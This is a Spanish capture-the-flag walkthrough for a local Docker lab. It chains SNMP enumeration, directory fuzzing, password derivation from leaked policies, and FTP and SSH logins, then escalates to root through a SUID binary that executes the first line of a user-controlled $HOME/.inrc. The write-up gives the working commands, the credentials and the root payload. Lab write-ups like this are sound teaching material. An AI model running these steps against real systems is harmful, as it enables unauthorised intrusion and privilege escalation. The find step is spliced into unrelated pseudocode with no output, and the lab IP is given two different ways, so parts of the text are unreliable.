# Intranet del patio

> Intranet del patio Norte (caja, turnos e inventario). Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh`
> `./startlab.sh blackout-pt04.tar`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap. No expongas el contenedor a internet.
>
> **Consejo:** empieza por nmap. Hay más de un servicio y más de una cuenta.

**Flag:** `WHOAMI{1ntr4n3t_p4t10_n14}`

---

## Resolución

El reto mezcla varios servicios (SNMP, FTP, SSH, web) y varias cuentas. Cada paso va encadenando credenciales hasta llegar a un binario SUID mal configurado que da root.

### 1. Levantar el lab y enumerar TCP + UDP

**Herramienta:** `nmap`. **Por qué:** el consejo dice "más de un servicio"; hay que escanear TCP y UDP.

**Parámetros:** `-sT -p-`/`--top-ports` (TCP), `-sU` (UDP), `-sV` (versiones).

```bash
$ nmap -sT -T4 --top-ports 2000 172.17.0.2
21, 22, 23, 80, 199, 502 (Modbus), 2121, 8080

$ nmap -sU -T4 --top-ports 100 172.17.0.2
161/udp   open  snmp
```

**Lo que vi:** SNMP en UDP (como en retos anteriores) y varios servicios TCP.

### 2. SNMP: obtener las primeras credenciales

**Herramienta:** `snmpwalk`. **Por qué:** la comunidad `public` suele exponer los campos de contacto, que en estos labs se usan como pista.

```bash
$ snmpwalk -v2c -c public 172.17.0.2 1.3.6.1.2.1.1
sysContact   = "admin"
sysLocation  = "latam123"
```

`admin:latam123` no sirve para SSH, pero es contexto.

### 3. Fuzzing web: encontrar el material oculto

**Herramienta:** `gobuster` + `sitemap.xml`. **Por qué:** el `robots.txt` y el sitemap revelan rutas que el menú no muestra.

```bash
$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
admin.php   (302 → /login.php)   index.php   robots.txt   sitemap.xml

$ curl -s http://172.17.0.2/robots.txt
Disallow: /backup-old/  /internal/
```

### 4. El código PHP revela la cuenta FTP y su política

**Herramienta:** `docker exec` (lectura del código fuente). **Por qué:** entender el login web y localizar las credenciales de los servicios.

El login PHP lee `/var/lib/latam/web.auth` (hash SHA256 de `lidia.subestacion`). Y `/var/lib/latam/admin.inc` filtra el material del FTP:

```
Usuario FTP local: respaldo.caja
clave_sha256: e724a9e1...
Politica FTP: RolCaja + # + Sitio + sector (sin espacios, sector dos digitos)
Rol del modulo: Caja   Sitio: Norte
```

**Decisión:** derivar la clave FTP de la política → `Caja#Norte14`, y verificar contra el hash SHA256.

### 5. Entrar al FTP con la política

**Herramienta:** `python3` + `curl`/`nc`. **Por qué:** la política da el formato exacto; se valida contra el hash y se usa en el FTP.

```bash
$ python3 -c "import hashlib; print(hashlib.sha256(b'Caja#Norte14').hexdigest())"
e724a9e18832dc72...   # coincide con admin.inc

$ curl -s "ftp://respaldo.caja:Caja%23Norte14@172.17.0.2/"
avisos/  bitacora/  inventario/  politicas/
```

El FTP tiene material: `bitacora/sesiones-2026.log` menciona el titular **`octavio.enlace`** y `politicas/rotacion_ssh.txt` da la política SSH:

```
Politica SSH: Nombre + : + Funcion + : + sector
Funcion: Enlace   Nombre = primera parte del titular (antes del punto)
clave_sha256: cd3a402293a22448...
```

→ Clave SSH derivada: **`Octavio:Enlace:14`** (verificada contra el SHA256).

### 6. Entrar por SSH

**Herramienta:** `sshpass` + `ssh`. **Por qué:** la clave SSH derivada de la política abre la cuenta `octavio.enlace`.

**Parámetros:** `-o PubkeyAuthentication=no -o PreferredAuthentications=password` fuerza autenticación por contraseña (evita el fallo por host key/pubkey).

```bash
$ sshpass -p "Octavio:Enlace:14" ssh -o PubkeyAuthentication=no \
    -o PreferredAuthentications=password octavio.enlace@172.17.0.2 "id"
uid=1001(octavio.enlace)
```

### 7. Encontrar el vector de escalada

**Herramienta:** `find -perm -4000`. **Por qué:** localizar binarios SUID (corren con permisos de su dueño root).

```bash
$ find / -perm -4000 -not -path "/proc/HOME")              # HOME controlado por el usuario
snprintf("%s/.inrc", HOME)       # ruta: $HOME/.inrc
fgets(...)                       # lee la primera línea del archivo
call setuid(0); call setgid(0)   # sube a root
call system(...)                 # ejecuta esa línea como root
```

### 8. Escalar a root con `$HOME/.inrc`

**Herramienta:** shell. **Por qué:** `in_apply` ejecuta la primera línea de `$HOME/.inrc` como root; como el usuario controla `$HOME`, escribe el comando deseado.

```bash
$ echo "id > /tmp/pwned; cat /var/lib/latam/intranet.dat > /tmp/f" > /home/octavio.enlace/.inrc
$ /usr/lib/latam/in_apply
$ cat /tmp/pwned
uid=0(root) gid=0(root)
$ cat /tmp/f
WHOAMI{1ntr4n3t_p4t10_n14}
```

## Lección

Cadena clásica de pentesting: SNMP filtra contexto → código fuente filtra una política de claves → la política deriva credenciales FTP y SSH → un binario SUID que ejecuta `system()` sobre un archivo controlado por el usuario (`$HOME/.inrc`) convierte el acceso en root. Y un detalle importante: forzar `PreferredAuthentications=password` evita fallos espurios de autenticación por pubkey.